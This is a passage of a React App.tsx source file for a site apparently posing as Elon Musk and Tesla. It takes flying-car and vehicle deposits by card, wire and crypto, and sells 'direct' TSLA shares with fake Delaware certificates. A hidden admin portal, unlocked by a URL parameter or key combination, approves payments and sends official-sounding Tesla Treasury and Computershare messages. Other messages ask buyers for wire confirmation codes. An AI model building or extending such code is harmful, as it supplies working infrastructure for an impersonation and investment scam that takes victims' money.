/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { 
  INITIAL_PROFILE, 
  INITIAL_COMPANIES, 
  INITIAL_FLYING_CAR_SPECS, 
  INITIAL_GALLERY 
} from './data/initialData';
import { TESLA_VEHICLES } from './data/teslaVehicles';
import { 
  ProfileData, 
  CompanyData, 
  FlyingCarSpecData, 
  GalleryImageData,
  TeslaVehicle,
  TeslaOrder,
  TeslaShareOrder,
  SharePriceAlert,
  InAppInboxMessage,
  InAppReply,
  PageId
} from './types';
import { PAGES_CONFIG } from './data/pagesData';
import { Navbar } from './components/Navbar';
import { PagePaginationFooter } from './components/PagePaginationFooter';
import { HeroSection } from './components/HeroSection';
import { AboutCompaniesSection } from './components/AboutCompaniesSection';
import { FlyingRoadsterSection } from './components/FlyingRoadsterSection';
import { TeslaShowroomSection } from './components/TeslaShowroomSection';
import { TeslaSharesSection } from './components/TeslaSharesSection';
import { GallerySection } from './components/GallerySection';
import { LightboxModal } from './components/LightboxModal';
import { CaptionEditorModal } from './components/CaptionEditorModal';
import { AddPhotoModal } from './components/AddPhotoModal';
import { ContentStudioModal } from './components/ContentStudioModal';
import { TeslaOrderModal } from './components/TeslaOrderModal';
import { MyOrdersModal } from './components/MyOrdersModal';
import { RsvpModal } from './components/RsvpModal';
import { ExecutiveChatWidget } from './components/ExecutiveChatWidget';
import { InAppInboxModal } from './components/InAppInboxModal';
import { HiddenAdminPortalModal } from './components/HiddenAdminPortalModal';
import { TeslaSharePurchaseModal } from './components/TeslaSharePurchaseModal';
import { ShareCertificateModal } from './components/ShareCertificateModal';
import { Footer } from './components/Footer';

const STORAGE_KEYS = {
  PROFILE: 'elon_meet_profile_v1',
  COMPANIES: 'elon_meet_companies_v1',
  SPECS: 'elon_meet_specs_v1',
  GALLERY: 'elon_meet_gallery_v1',
  ORDERS: 'elon_meet_orders_v1',
  SHARES: 'elon_meet_shares_v1',
  PRICE_ALERTS: 'elon_meet_price_alerts_v1',
  INBOX: 'elon_meet_inbox_v1',
  CUSTOM_CARS: 'elon_meet_custom_cars_v1',
};

const INITIAL_INBOX_MESSAGES: InAppInboxMessage[] = [
  {
    id: 'msg-welcome-01',
    sender: 'concierge',
    senderName: 'Executive Concierge Desk',
    subject: 'Welcome to Executive Fleet & In-App Command',
    body: 'Greetings. This official terminal gives you direct, unmediated access to executive briefings, the aerospace Tesla Flying Roadster reservation program, and priority vehicle production queueing.\n\nAll vehicle reservation payments and wires are routed directly to the Central Admin Approval Desk for verification and chassis VIN allocation. You can message the desk directly here and reply inside the app anytime without third-party email.',
    category: 'general',
    read: false,
    timestamp: new Date().toISOString(),
    timeStr: 'Today',
    replies: [
      {
        id: 'reply-concierge-01',
        sender: 'concierge',
        senderName: 'Concierge Protocol',
        body: 'Tip: Click "Pre-Order Flying Car" at top right to configure cold-gas rocket thruster options and submit your reservation.',
        timestamp: new Date().toISOString(),
        timeStr: 'Today',
      }
    ],
  },
  {
    id: 'msg-treasury-notice',
    sender: 'concierge',
    senderName: 'Tesla Central Treasury Desk',
    subject: 'Direct In-App Payment Approval & VIN Allocation Protocol',
    body: 'Notice to vehicle buyers: To ensure strict allocation integrity, all credit card deposits, ACH wire transfers, and crypto escrow payments are reviewed and approved directly by the Executive Admin Portal.\n\nUpon submission of an order, your reservation VIN will enter "Pending Admin Approval" status. You will receive an instant approval dispatch and build certificate right in this messaging inbox.',
    category: 'payment_approval',
    read: true,
    timestamp: new Date().toISOString(),
    timeStr: 'Today',
    replies: [],
  },
];

export default function App() {
  // Profile state with local storage fallback
  const [profile, setProfile] = useState<ProfileData>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.PROFILE);
      if (saved) {
        const parsed: ProfileData = JSON.parse(saved);
        // Ensure new official theme display photo takes effect if previous default was stored
        if (!parsed.portrait || parsed.portrait === '/assets/aistudio/elo_e882ff2e.webp' || !parsed.portrait.includes('OIP__19__b4ca5349')) {
          parsed.portrait = INITIAL_PROFILE.portrait;
        }
        return parsed;
      }
      return INITIAL_PROFILE;
    } catch {
      return INITIAL_PROFILE;
    }
  });

  // Companies state
  const [companies, setCompanies] = useState<CompanyData[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.COMPANIES);
      return saved ? JSON.parse(saved) : INITIAL_COMPANIES;
    } catch {
      return INITIAL_COMPANIES;
    }
  });

  // Flying Car Specs state
  const [specs, setSpecs] = useState<FlyingCarSpecData[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.SPECS);
      return saved ? JSON.parse(saved) : INITIAL_FLYING_CAR_SPECS;
    } catch {
      return INITIAL_FLYING_CAR_SPECS;
    }
  });

  // Gallery Images state (populated with the uploaded photos with DOGE photo as #1 and contemplation photo in gallery)
  const [gallery, setGallery] = useState<GalleryImageData[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.GALLERY);
      if (saved) {
        let parsed: GalleryImageData[] = JSON.parse(saved);
        const hasDogeFirst = parsed.length > 0 && parsed[0].image.includes('OIP__19__b4ca5349');
        if (!hasDogeFirst) {
          const filtered = parsed.filter(item => !item.image.includes('OIP__19__b4ca5349'));
          parsed = [INITIAL_GALLERY[0], ...filtered];
        }
        const hasContemplation = parsed.some(item => item.image.includes('OIP__20__21234731'));
        if (!hasContemplation && INITIAL_GALLERY[1]) {
          parsed.splice(1, 0, INITIAL_GALLERY[1]);
        }
        return parsed;
      }
      return INITIAL_GALLERY;
    } catch {
      return INITIAL_GALLERY;
    }
  });

  // Tesla Vehicle Orders State (persisted to localStorage)
  const [orders, setOrders] = useState<TeslaOrder[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.ORDERS);
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  // In-App Messaging Inbox State (persisted to localStorage)
  const [inboxMessages, setInboxMessages] = useState<InAppInboxMessage[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.INBOX);
      return saved ? JSON.parse(saved) : INITIAL_INBOX_MESSAGES;
    } catch {
      return INITIAL_INBOX_MESSAGES;
    }
  });

  // Admin Custom Car Listings State (persisted to localStorage)
  const [customCars, setCustomCars] = useState<TeslaVehicle[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.CUSTOM_CARS);
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  // Tesla TSLA Direct Share Allocations State (persisted to localStorage)
  const [shareOrders, setShareOrders] = useState<TeslaShareOrder[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.SHARES);
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  // Simulated Live TSLA Market Price & Share Price Alerts
  const [simulatedSharePrice, setSimulatedSharePrice] = useState<number>(268.50);
  const [isMarketSimRunning, setIsMarketSimRunning] = useState<boolean>(false);
  const [priceAlerts, setPriceAlerts] = useState<SharePriceAlert[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEYS.PRICE_ALERTS);
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  // Modal control states
  const [lightboxIndex, setLightboxIndex] = useState<number | null>(null);
  const [editingItem, setEditingItem] = useState<GalleryImageData | null>(null);
  const [isAddPhotoOpen, setIsAddPhotoOpen] = useState<boolean>(false);
  const [isContentStudioOpen, setIsContentStudioOpen] = useState<boolean>(false);
  const [isRsvpOpen, setIsRsvpOpen] = useState<boolean>(false);
  const [orderingVehicle, setOrderingVehicle] = useState<TeslaVehicle | null>(null);
  const [isMyOrdersOpen, setIsMyOrdersOpen] = useState<boolean>(false);
  const [isInboxOpen, setIsInboxOpen] = useState<boolean>(false);
  const [isAdminPortalOpen, setIsAdminPortalOpen] = useState<boolean>(false);
  const [isShareModalOpen, setIsShareModalOpen] = useState<boolean>(false);
  const [shareModalInitialQty, setShareModalInitialQty] = useState<number>(25);
  const [selectedShareCertOrder, setSelectedShareCertOrder] = useState<TeslaShareOrder | null>(null);

  // Active page state for arranged page-by-page experience
  const [activePage, setActivePage] = useState<PageId>(() => {
    try {
      if (typeof window !== 'undefined' && window.location.hash) {
        const hash = window.location.hash.replace('#', '');
        if (hash === 'about' || hash === 'enterprises') return 'enterprises';
        if (hash === 'flying-roadster' || hash === 'flying-car') return 'flying-roadster';
        if (hash === 'showroom' || hash === 'tesla') return 'showroom';
        if (hash === 'shares' || hash === 'tsla' || hash === 'equity') return 'shares';
        if (hash === 'gallery') return 'gallery';
      }
    } catch {
      // fallback
    }
    return 'executive';
  });

  // Slide-in transition animation direction when switching pages
  const [slideDirection, setSlideDirection] = useState<'forward' | 'backward'>('forward');

  // View arrangement mode: 'paged' (page by page, arranged) or 'scroll' (continuous)
  const [viewMode, setViewMode] = useState<'paged' | 'scroll'>('paged');

  // Admin state (false by default so studio button is hidden from public visitors)
  const [isAdmin, setIsAdmin] = useState<boolean>(() => {
    try {
      if (typeof window !== 'undefined') {
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('admin') === 'true') return true;
        return localStorage.getItem('elon_admin_access') === 'true';
      }
      return false;
    } catch {
      return false;
    }
  });

  // Optional keyboard toggle for admin (Ctrl + Shift + A)
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.ctrlKey && e.shiftKey && (e.key === 'A' || e.key === 'a')) {
        setIsAdmin((prev) => {
          const next = !prev;
          try {
            localStorage.setItem('elon_admin_access', String(next));
          } catch {}
          return next;
        });
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  // Sync to local storage
  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_KEYS.PROFILE, JSON.stringify(profile));
    } catch (e) {
      console.warn('LocalStorage save failed for profile', e);
    }
  }, [profile]);

  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_KEYS.COMPANIES, JSON.stringify(companies));
    } catch (e) {
      console.warn('LocalStorage save failed for companies', e);
    }
  }, [companies]);

  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_KEYS.SPECS, JSON.stringify(specs));
    } catch (e) {
      console.warn('LocalStorage save failed for specs', e);
    }
  }, [specs]);

  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_KEYS.GALLERY, JSON.stringify(gallery));
    } catch (e) {
      console.warn('LocalStorage save failed for gallery', e);
    }
  }, [gallery]);

  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_KEYS.ORDERS, JSON.stringify(orders));
    } catch (e) {
      console.warn('LocalStorage save failed for orders', e);
    }
  }, [orders]);

  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_KEYS.INBOX, JSON.stringify(inboxMessages));
    } catch (e) {
      console.warn('LocalStorage save failed for inbox', e);
    }
  }, [inboxMessages]);

  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_KEYS.CUSTOM_CARS, JSON.stringify(customCars));
    } catch (e) {
      console.warn('LocalStorage save failed for custom cars', e);
    }
  }, [customCars]);

  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_KEYS.SHARES, JSON.stringify(shareOrders));
    } catch (e) {
      console.warn('LocalStorage save failed for share orders', e);
    }
  }, [shareOrders]);

  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_KEYS.PRICE_ALERTS, JSON.stringify(priceAlerts));
    } catch (e) {
      console.warn('LocalStorage save failed for price alerts', e);
    }
  }, [priceAlerts]);

  // Simulated Market Feed Interval (ticks price every 2.2s when running)
  useEffect(() => {
    if (!isMarketSimRunning) return;
    const timer = window.setInterval(() => {
      setSimulatedSharePrice((prev) => {
        const delta = (Math.random() - 0.45) * 3.2;
        const next = Math.round((prev + delta) * 100) / 100;
        return Math.min(450, Math.max(150, next));
      });
    }, 2200);
    return () => window.clearInterval(timer);
  }, [isMarketSimRunning]);

  // Monitor Simulated Share Price Against Active Target Alerts & Dispatch to In-App Inbox
  useEffect(() => {
    const newlyTriggered = priceAlerts.filter(
      (alert) =>
        alert.status === 'active' &&
        ((alert.direction === 'above' && simulatedSharePrice >= alert.targetPrice) ||
          (alert.direction === 'below' && simulatedSharePrice <= alert.targetPrice))
    );

    if (newlyTriggered.length === 0) return;

    const triggeredIds = new Set(newlyTriggered.map((a) => a.id));
    const nowIso = new Date().toISOString();
    const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

    setPriceAlerts((prev) =>
      prev.map((a) =>
        triggeredIds.has(a.id)
          ? {
              ...a,
              status: 'triggered',
              triggeredAt: nowIso,
              triggeredPrice: simulatedSharePrice,
            }
          : a
      )
    );

    const alertNotifications: InAppInboxMessage[] = newlyTriggered.map((alert) => ({
      id: `msg-price-alert-${alert.id}-${Date.now()}`,
      sender: 'concierge',
      senderName: 'TSLA Market Desk · Automated Alert',
      subject: `TSLA Target Price Reached: $${simulatedSharePrice.toFixed(2)} (${
        alert.direction === 'above' ? 'Above' : 'Below'
      } $${alert.targetPrice.toFixed(2)})`,
      body: `Automated Market Threshold Notification:\n\nSimulated NASDAQ: TSLA share price has reached $${simulatedSharePrice.toFixed(
        2
      )} USD, crossing your ${
        alert.direction === 'above' ? 'upside target' : 'downside entry'
      } alert set at $${alert.targetPrice.toFixed(2)} USD.\n\nAlert ID: ${alert.id}\nTriggered At: ${new Date().toLocaleString()}${
        alert.note ? `\nNote: ${alert.note}` : ''
      }\n\nYou can return to the Tesla Direct Equity Desk to acquire shares at this market price or reply directly here to coordinate an institutional block allocation.`,
      category: 'price_alert',
      read: false,
      timestamp: nowIso,
      timeStr: timeNow,
      replies: [],
    }));

    setInboxMessages((prev) => [...alertNotifications, ...prev]);
  }, [simulatedSharePrice, priceAlerts]);

  const handleCreatePriceAlert = (
    targetPrice: number,
    direction: 'above' | 'below',
    note?: string
  ) => {
    const newAlert: SharePriceAlert = {
      id: `ALERT-${Date.now().toString().slice(-5)}`,
      targetPrice: Math.round(targetPrice * 100) / 100,
      direction,
      createdAt: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      status: 'active',
      note: note?.trim() || undefined,
    };
    setPriceAlerts((prev) => [newAlert, ...prev]);
  };

  const handleDeletePriceAlert = (alertId: string) => {
    setPriceAlerts((prev) => prev.filter((a) => a.id !== alertId));
  };

  // Combined fleet of standard models + admin custom added car listings
  const allVehicles = [...TESLA_VEHICLES, ...customCars];

  // Gallery handlers
  const handleSaveCaption = (updatedItem: GalleryImageData) => {
    setGallery((prev) =>
      prev.map((item) => (item.id === updatedItem.id ? updatedItem : item))
    );
  };

  const handleAddPhoto = (newPhoto: GalleryImageData) => {
    setGallery((prev) => [newPhoto, ...prev]);
  };

  const handleResetGallery = () => {
    if (window.confirm('Reset all gallery captions and photos back to initial defaults?')) {
      setGallery(INITIAL_GALLERY);
      localStorage.removeItem(STORAGE_KEYS.GALLERY);
    }
  };

  // Page navigation handlers
  const handleSelectPage = (page: PageId) => {
    const oldIndex = PAGES_CONFIG.findIndex((p) => p.id === activePage);
    const newIndex = PAGES_CONFIG.findIndex((p) => p.id === page);
    if (newIndex !== -1 && oldIndex !== -1 && newIndex !== oldIndex) {
      setSlideDirection(newIndex > oldIndex ? 'forward' : 'backward');
    }
    setActivePage(page);
    try {
      const hashMapping: Record<PageId, string> = {
        'executive': '#meet',
        'enterprises': '#about',
        'flying-roadster': '#flying-roadster',
        'showroom': '#showroom',
        'shares': '#shares',
        'gallery': '#gallery',
      };
      if (window.history && window.history.replaceState) {
        window.history.replaceState(null, '', hashMapping[page]);
      }
    } catch {}
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handlePrimaryAction = (pageId: PageId) => {
    switch (pageId) {
      case 'executive':
        setIsRsvpOpen(true);
        break;
      case 'enterprises':
        handleSelectPage('flying-roadster');
        break;
      case 'flying-roadster':
        handlePreOrderFlyingRoadster();
        break;
      case 'showroom':
        if (TESLA_VEHICLES.length > 0) {
          setOrderingVehicle(TESLA_VEHICLES[0]);
        }
        break;
      case 'shares':
        setShareModalInitialQty(25);
        setIsShareModalOpen(true);
        break;
      case 'gallery':
        if (gallery.length > 0) {
          setLightboxIndex(0);
        }
        break;
    }
  };

  // Keyboard shortcut listener for fast chapter jumping (1-5 and Arrow keys)
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      const target = e.target as HTMLElement;
      if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable)) {
        return;
      }

      // Check number keys 1-5
      const keyNum = parseInt(e.key, 10);
      if (!isNaN(keyNum) && keyNum >= 1 && keyNum <= PAGES_CONFIG.length) {
        e.preventDefault();
        const targetPage = PAGES_CONFIG[keyNum - 1];
        if (targetPage) {
          handleSelectPage(targetPage.id);
        }
      }

      // Arrow keys (Left / Right) for previous / next page
      if (e.key === 'ArrowRight') {
        const currentIndex = PAGES_CONFIG.findIndex((p) => p.id === activePage);
        if (currentIndex < PAGES_CONFIG.length - 1) {
          e.preventDefault();
          handleSelectPage(PAGES_CONFIG[currentIndex + 1].id);
        }
      } else if (e.key === 'ArrowLeft') {
        const currentIndex = PAGES_CONFIG.findIndex((p) => p.id === activePage);
        if (currentIndex > 0) {
          e.preventDefault();
          handleSelectPage(PAGES_CONFIG[currentIndex - 1].id);
        }
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [activePage]);

  // Order handlers with auto-dispatch to in-app messaging inbox
  const handleOrderCompleted = (newOrder: TeslaOrder) => {
    setOrders((prev) => [newOrder, ...prev]);

    // Dispatch in-app message notifying visitor that payment is directed to admin for approval
    const orderNoticeMsg: InAppInboxMessage = {
      id: `msg-order-${Date.now()}`,
      sender: 'concierge',
      senderName: 'Tesla Central Treasury Desk',
      subject: `Order #${newOrder.orderId}: Payment Directed to Admin for Approval`,
      body: `Your reservation for ${newOrder.vehicleName} with deposit of $${newOrder.amountPaidToday.toLocaleString()} (${(newOrder.paymentMethod || 'card').toUpperCase()}) has been received.\n\nPayment Status: PENDING ADMIN APPROVAL\nPayment Reference: ${newOrder.paymentReference || 'N/A'}\nReservation VIN: ${newOrder.reservationVin}\n\nThe Executive Admin Desk has been notified to verify your payment and finalize your vehicle build slot. You will receive an instant in-app update here once approved. You can reply directly in this thread for any questions.`,
      category: 'payment_approval',
      read: false,
      timestamp: new Date().toISOString(),
      timeStr: 'Just now',
      replies: [],
    };
    setInboxMessages((prev) => [orderNoticeMsg, ...prev]);
  };

  const handleCancelOrder = (orderId: string) => {
    if (window.confirm('Cancel this vehicle reservation and process refund?')) {
      setOrders((prev) => prev.filter((o) => o.orderId !== orderId));
    }
  };

  // Payment approval actions directed to admin
  const handleApprovePayment = (orderId: string, notes?: string) => {
    const targetOrder = orders.find((o) => o.orderId === orderId);
    if (!targetOrder) return;

    const now = new Date();
    const dateStr = now.toLocaleString('en-US', {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
      hour: 'numeric',
      minute: '2-digit',
    });

    setOrders((prev) =>
      prev.map((o) =>
        o.orderId === orderId
          ? {
              ...o,
              paymentStatus: 'approved',
              status: 'Payment Approved & VIN Allocated',
              approvedAt: now.toISOString(),
              approvalNotes: notes || 'Verified and approved by Central Executive Admin Desk.',
              trackingHistory: [
                ...(o.trackingHistory || []),
                {
                  id: `trk-approve-${now.getTime()}`,
                  stage: 'Assembly',
                  title: 'Payment Approved & VIN Allocated',
                  details: notes || `Settlement verified ($${o.amountPaidToday.toLocaleString()}) and VIN ${o.reservationVin} scheduled into Gigafactory Assembly.`,
                  location: 'Tesla Executive Admin & Treasury Desk',
                  timestamp: now.toISOString(),
                  dateStr,
                  statusType: 'approved',
                },
              ],
            }
          : o
      )
    );

    // Auto-dispatch approval message directly to visitor's in-app inbox
    const approvalMsg: InAppInboxMessage = {
      id: `msg-approval-${Date.now()}`,
      sender: 'concierge',
      senderName: 'Tesla Executive Admin & Treasury',
      subject: `Payment Approved: ${targetOrder.vehicleName} (VIN ${targetOrder.reservationVin})`,
      body: `Your payment of $${targetOrder.amountPaidToday.toLocaleString()} for the ${targetOrder.vehicleName} has been verified and APPROVED by the Central Admin Desk.\n\nChassis VIN ${targetOrder.reservationVin} is now permanently secured in our Gigafactory priority production schedule.\n\nDelivery Destination: ${targetOrder.deliveryAddress || targetOrder.city || 'Tesla Delivery Center'}\nEstimated Delivery: ${targetOrder.estimatedDelivery}${notes ? `\n\nAdmin Allocation Notes: ${notes}` : ''}\n\nYou can reply directly in this thread for any questions.`,
      category: 'payment_approval',
      read: false,
      timestamp: now.toISOString(),
      timeStr: 'Just now',
      replies: [],
    };
    setInboxMessages((prev) => [approvalMsg, ...prev]);
  };

  const handleRejectPayment = (orderId: string, reason?: string) => {
    const targetOrder = orders.find((o) => o.orderId === orderId);
    if (!targetOrder) return;

    const now = new Date();
    const dateStr = now.toLocaleString('en-US', {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
      hour: 'numeric',
      minute: '2-digit',
    });

    setOrders((prev) =>
      prev.map((o) =>
        o.orderId === orderId
          ? {
              ...o,
              paymentStatus: 'rejected',
              status: 'Payment Verification Needed',
              approvalNotes: reason || 'Transfer reference could not be matched.',
              trackingHistory: [
                ...(o.trackingHistory || []),
                {
                  id: `trk-reject-${now.getTime()}`,
                  stage: 'Production',
                  title: 'Payment Verification Hold',
                  details: reason || 'Transfer reference could not be matched. Awaiting buyer confirmation.',
                  location: 'Tesla Central Treasury Desk',
                  timestamp: now.toISOString(),
                  dateStr,
                  statusType: 'rejected',
                },
              ],
            }
          : o
      )
    );

    const rejectMsg: InAppInboxMessage = {
      id: `msg-reject-${Date.now()}`,
      sender: 'concierge',
      senderName: 'Tesla Central Treasury Desk',
      subject: `Payment Verification Required: Order ${targetOrder.orderId}`,
      body: `We could not verify the transfer for ${targetOrder.vehicleName} (${targetOrder.paymentReference}).\n\nReason: ${reason || 'Bank reference mismatch or missing gateway signature'}.\n\nPlease reply directly in this thread with your transaction receipt or wire confirmation code so we can re-verify and confirm your build slot.`,
      category: 'payment_approval',
      read: false,
      timestamp: now.toISOString(),
      timeStr: 'Just now',
      replies: [],
    };
    setInboxMessages((prev) => [rejectMsg, ...prev]);
  };

  const handleUpdateOrderStatus = (orderId: string, nextStatus: TeslaOrder['status']) => {
    const targetOrder = orders.find((o) => o.orderId === orderId);
    if (!targetOrder) return;

    const now = new Date();
    const dateStr = now.toLocaleString('en-US', {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
      hour: 'numeric',
      minute: '2-digit',
    });
    const deliveryDateStr = now.toLocaleDateString('en-US', {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
    });
    const isFinalDelivery = nextStatus === 'Delivered' || nextStatus === 'Ready for Delivery';

    const stageFacilityMap: Record<string, { stage: string; location: string; details: string }> = {
      'Production Scheduled': {
        stage: 'Production',
        location: 'Gigafactory Texas · Chassis & Casting',
        details: `Chassis VIN ${targetOrder.reservationVin} locked into stamping press build sequence.`,
      },
      'Factory Assembly': {
        stage: 'Assembly',
        location: 'General Assembly Line · Automated Robotics',
        details: `Powertrain, battery pack, ${targetOrder.selectedColor.name} paint finish, and ${targetOrder.selectedInterior.name} cabin installed.`,
      },
      'Quality Inspection': {
        stage: 'Quality Check',
        location: 'Gigafactory Quality & Dyno Bay',
        details: 'High-voltage isolation, panel gap audit, ADAS camera calibration, and rolling dyno passed.',
      },
      'In Transit': {
        stage: 'In Transit',
        location: `En Route · ${targetOrder.deliveryAddress || targetOrder.city || 'Regional Hub'}`,
        details: `Vehicle loaded onto insured enclosed carrier bound for ${targetOrder.city || 'Tesla Delivery Center'}.`,
      },
      'Ready for Delivery': {
        stage: 'Delivery',
        location: `${targetOrder.deliveryAddress || targetOrder.city || 'Tesla Delivery Center'}`,
        details: `Final detailing completed and vehicle staged in Delivery Bay for ${targetOrder.customerName}.`,
      },
      Delivered: {
        stage: 'Delivery',
        location: `${targetOrder.deliveryAddress || targetOrder.city || 'Tesla Delivery Center'}`,
        details: `Final handover completed to ${targetOrder.customerName}. Digital keys activated and ownership record finalized.`,
      },
    };

    const meta = stageFacilityMap[nextStatus] || {
      stage: nextStatus,
      location: 'Tesla Logistics Network',
      details: `Order status transitioned to ${nextStatus}.`,
    };

    setOrders((prev) =>
      prev.map((o) =>
        o.orderId === orderId
          ? {
              ...o,
              status: nextStatus,
              ...(isFinalDelivery
                ? {
                    deliveredAt: now.toISOString(),
                    deliveryDate: deliveryDateStr,
                  }
                : {}),
              trackingHistory: [
                ...(o.trackingHistory || []),
                {
                  id: `trk-stage-${now.getTime()}`,
                  stage: meta.stage,
                  title: isFinalDelivery ? 'Final Delivery Completed' : `Stage Updated: ${nextStatus}`,
                  details: meta.details,
                  location: meta.location,
                  timestamp: now.toISOString(),
                  dateStr,
                  statusType: isFinalDelivery ? 'delivered' : 'stage_update',
                },
              ],
            }
          : o
      )
    );

    const statusMsg: InAppInboxMessage = {
      id: `msg-stage-${Date.now()}`,
      sender: 'concierge',
      senderName: 'Tesla Gigafactory Build Telemetry',
      subject: `Build Update (${nextStatus}): ${targetOrder.vehicleName}`,
      body: `Order ${targetOrder.orderId} (VIN ${targetOrder.reservationVin}) has transitioned to: ${nextStatus}.\n\nDestination Hub: ${targetOrder.deliveryAddress || targetOrder.city || 'Tesla Delivery Center'}\nEstimated Window: ${targetOrder.estimatedDelivery}`,
      category: 'order_update',
      orderId,
      read: false,
      timestamp: now.toISOString(),
      timeStr: 'Just now',
      replies: [],
    };
    setInboxMessages((prev) => [statusMsg, ...prev]);
  };

  // TSLA Share Allocation handlers with auto-dispatch to in-app inbox
  const handleShareOrderCompleted = (newShareOrder: TeslaShareOrder) => {
    setShareOrders((prev) => [newShareOrder, ...prev]);

    // Dispatch in-app message notifying visitor that share payment is directed to admin for approval
    const shareNoticeMsg: InAppInboxMessage = {
      id: `msg-share-${Date.now()}`,
      sender: 'concierge',
      senderName: 'Tesla Treasury & Transfer Agent Desk',
      subject: `TSLA Allocation #${newShareOrder.orderId}: Payment Directed to Admin Desk`,
      body: `Your allocation request for ${newShareOrder.shareQuantity} common shares of Tesla, Inc. (${newShareOrder.custodyType === 'drs_computershare' ? 'DRS Computershare' : newShareOrder.custodyType === 'dtc_broker' ? 'DTC Broker' : 'Vault Physical'}) totaling $${newShareOrder.totalInvestment.toLocaleString()} USD has been received.\n\nProvisional Certificate No: ${newShareOrder.certificateNumber}\nPayment Method: ${newShareOrder.paymentMethod.toUpperCase()}\nPayment Status: PENDING ADMIN APPROVAL\nCUSIP: 88160R101\n\nThe Executive Admin Desk has been notified to verify your settlement and finalize your Delaware corporate ledger book-entry registration. You will receive an instant approval dispatch and final certificate here once verified. You can reply directly in this thread for any questions.`,
      category: 'payment_approval',
      read: false,
      timestamp: new Date().toISOString(),
      timeStr: 'Just now',
      replies: [],
    };
    setInboxMessages((prev) => [shareNoticeMsg, ...prev]);
  };

  const handleApproveShareOrder = (orderId: string, notes?: string) => {
    const targetOrder = shareOrders.find((s) => s.orderId === orderId);
    if (!targetOrder) return;

    setShareOrders((prev) =>
      prev.map((s) =>
        s.orderId === orderId
          ? {
              ...s,
              paymentStatus: 'approved',
              approvedAt: new Date().toISOString(),
              approvalNotes: notes || 'Verified and approved by Central Executive Treasury Admin Desk.',
            }
          : s
      )
    );

    // Auto-dispatch approval message directly to visitor's in-app inbox
    const approvalMsg: InAppInboxMessage = {
      id: `msg-share-appr-${Date.now()}`,
      sender: 'concierge',
      senderName: 'Tesla Executive Treasury & Computershare Registrar',
      subject: `TSLA Share Allocation APPROVED: Certificate #${targetOrder.certificateNumber}`,
      body: `Official Notice: Your purchase of ${targetOrder.shareQuantity} shares of Tesla, Inc. Common Stock ($${targetOrder.totalInvestment.toLocaleString()} USD) has been verified and APPROVED by the Central Admin Desk.\n\nCertificate No: ${targetOrder.certificateNumber}\nBeneficial Registered Owner: ${targetOrder.investorName}\nDepository: ${targetOrder.custodyType === 'drs_computershare' ? 'Direct Registration System (Computershare Trust Company N.A.)' : targetOrder.custodyType === 'dtc_broker' ? 'DTC Participant Electronic Transfer' : 'State of Delaware Archival Physical Certificate'}\nState of Delaware Charter: 3649528 · CUSIP: 88160R101${notes ? `\n\nAdmin Allocation Notes: ${notes}` : ''}\n\nYour official certificate is confirmed. You can view or print your Delaware stock certificate anytime, or reply directly in this thread with any questions.`,
      category: 'payment_approval',
      read: false,
      timestamp: new Date().toISOString(),
      timeStr: 'Just now',
      replies: [],
    };
    setInboxMessages((prev) => [approvalMsg, ...prev]);
  };

  const handleRejectShareOrder = (orderId: string, reason?: string) => {
    const targetOrder = shareOrders.find((s) => s.orderId === orderId);
    if (!targetOrder) return;

    setShareOrders((prev) =>
      prev.map((s) =>
        s.orderId === orderId
          ? {
              ...s,
              paymentStatus: 'rejected',
              approvalNotes: reason || 'Wire/ACH transfer reference could not be matched.',
            }
          : s
      )
    );

    const rejectMsg: InAppInboxMessage = {
      id: `msg-share-rej-${Date.now()}`,
      sender: 'concierge',
      senderName: 'Tesla Treasury Transfer Agent Desk',
      subject: `Settlement Verification Required: TSLA Order #${targetOrder.orderId}`,
      body: `We could not verify the settlement wire for ${targetOrder.shareQuantity} TSLA shares (Cert #${targetOrder.certificateNumber}).\n\nReason: ${reason || 'Bank transfer reference mismatch or missing incoming Fedwire credit'}.\n\nPlease reply directly in this thread with your bank wire confirmation code (IMAD/OMAD) so our treasury desk can assist.`,
      category: 'payment_approval',
      read: false,
      timestamp: new Date().toISOString(),
      timeStr: 'Just now',
      replies: [],
    };
    setInboxMessages((prev) => [rejectMsg, ...prev]);
  };

  // Custom Car Listing handlers (Admin Portal)
  const handleAddNewCar = (newCar: TeslaVehicle) => {
    setCustomCars((prev) => [newCar, ...prev]);
  };

  const handleDeleteCustomCar = (carId: string) => {
